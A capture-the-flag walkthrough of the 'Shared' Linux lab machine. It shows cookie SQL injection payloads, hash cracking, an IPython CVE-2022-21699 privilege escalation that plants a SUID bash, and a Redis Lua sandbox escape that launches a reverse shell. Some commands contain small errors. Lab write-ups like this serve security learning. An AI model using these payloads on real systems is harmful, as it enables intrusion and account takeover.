# Shared
### Medium linux box

##### Begin with an nmap scan:
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FsixO74ZQmWWjbatdV7WQ%2Fuploads%2FvunymQaGuIELhAVfpFNU%2Fnmapscan.jpg?alt=media&token=36d6168c-845f-4150-be68-ecfc1a51dd68 "nmap results")

##### Access port 80 and navigate to the checkout page. Observe a URL-encoded cookie called `custom_cart=`. Decode the cookie and take note of its format: `<Item>:<Quantity>`
The cookie turned out to be vulnerable to SQL injection (SQLi). I found Portswigger's SQLi courses particularly helpful. Don't forget to URL encode the payload.
##### The cookie ended up being vulnerable to SQLi. Portswigger's sqli courses helped a lot here. URL encode the payload.

#### `' UNION SELECT 1 -- -` No values
#### `' UNION SELECT 1,2 -- -` No values
#### `' UNION SELECT 1,2,3 -- -` Values are reflected!
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FsixO74ZQmWWjbatdV7WQ%2Fuploads%2FiMA8il58YnoiSfSBNhwv%2FBURPCOOKIESQL.jpg?alt=media&token=ca2f7673-855a-4e73-9e13-626d989795d6)

### SQLi payloads:
##### Determine the current database:
#### `' UNION SELECT 1,database(),3 -- -`
##### Retrieve tables in the checkout database:
#### `'UNION SELECT 1,group_concat(table_name),3 from information_schema.tables WHERE table_schema='checkout' -- -`
##### Enumerate columns in the user table from the checkout database:
#### `' UNION SELECT 1,group_concat(column_name),3 from information_schema.tables WHERE table_schema='user' -- -`
##### Obtain values from the user table:
#### `' UNION SELECT 1,group_concat(id, ':', password),3 from checkout.user -- -`

##### Eventually, a hash is obtained that can be cracked using hashcat.
#### `hashcat -a -0 -m -0 <hash> <wordlist>`

##### ssh into the james_mason account with the cracked password

### Privilege Escalation
##### Transfer pspy64 and linpeas to the machine to observe running processes and identify sensitive files.
##### Discover ipython and an intriguing file, `/opt/scripts_review`. It exposes a cron job executed every minute by `dan_smith`.
```bash
/bin/sh -c
/usr/bin/pkill ipython;
cd opt/scripts review/ && /usr/local/bin/ipython
```

##### Further investigation reveals CVE-2022-21699, an "Arbitrary code execution vulnerability in IPython that stems from IPython executing untrusted files in CWD. This vulnerability allows one user to run code as another."
##### 1. Based on the cron job, ipython is executed at the `/opt/scripts_review` directory where we have write access.
##### 2. We need to create `/opt/scripts_review/profile_default` and `opt/scripts_review/profile_default/startup`.
##### 3. Generate a Python script to set the SUID bit of `dan_smith` to `/bin/bash`, allowing us to escalate privileges at `/opt/scripts_review/profile_default/startup`.

   
#### Create a script that creates a directory and another Python script that executes `script.sh`
```bash
james_mason@shared:/tmp$ cat script.sh
mkdir -m 777 /opt/scripts_review/profile_default
mkdir -m 777 /opt/scripts_review/profile_default/startup
echo 'import os; os.system("cp /bin/bash /tmp/danbash; chmod u+s /tmp/danbash")' > /opt/scripts_review/profile_default/startup/foo.py
james_mason@shared: /tmp$ chmod +x script.sh
james_mason@shared: /tmp$ ./script.sh
```
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FsixO74ZQmWWjbatdV7WQ%2Fuploads%2FiHCOT3FpQ65fr8Iq6a5t%2Fimage.png?alt=media&token=188fb7a8-1648-49d5-bfdd-b4b9e7dc80cb "script.sh")

##### Continuously run `script.sh` because there is a root cron job that deletes everything in `scripts_review`. Wait for the cron job to execute and create `danbash`. Then execute `danbash`.

```bash
james_mason@shared: /tmp$ ./danbash -p
```
##### From there you can copy the ssh key for `dan_smith` and ssh into the account for a better shell
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FsixO74ZQmWWjbatdV7WQ%2Fuploads%2FRENhkyRf5bpOe4mSigPK%2Fimage.png?alt=media&token=d22f0e92-ee4f-48ae-bfa5-dd01ac9eb785 "id_rsa")

### Redis Lua Sandbox Escape and RCE to Obtain Root
##### Upload and execute linpeas, which reveals a readable file at `/usr/local/bin/redis_connector_dev`.
It is an ELF file that, when executed, connects to `redis-cli` using a password and then runs an `INFO` command.
Transfer `redis_connector_dev` to your machine, run a `netcat` listener, and you should obtain a password.
Refer to the helpful guide below for the exploit:

##### Helpful guide to the exploit below
[redis exploit](https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md)

##### Due to a packaging issue on Debian/Ubuntu, a remote attacker with the ability to execute arbitrary Lua scripts could escape the Lua sandbox and execute arbitrary code on the host.
##### Authenticate and connect to `redis-cli`. Use the command `AUTH <password>` and execute the command again. Write a reverse shell to be run from the server.
![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FsixO74ZQmWWjbatdV7WQ%2Fuploads%2F0cOyfwWEIdhYqzkPVu3f%2Fimage.png?alt=media&token=203448cb-a4c6-48a0-a8e9-02ee9e3f0a6c "python reverse shell")

##### Start a netcat listener and execute the reverse shell to obtain a root shell.
```bash
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("python3 /home/dan_smith/shell.py", "r"); local res = f:read("*a"); f:close(); return res' 0 
```




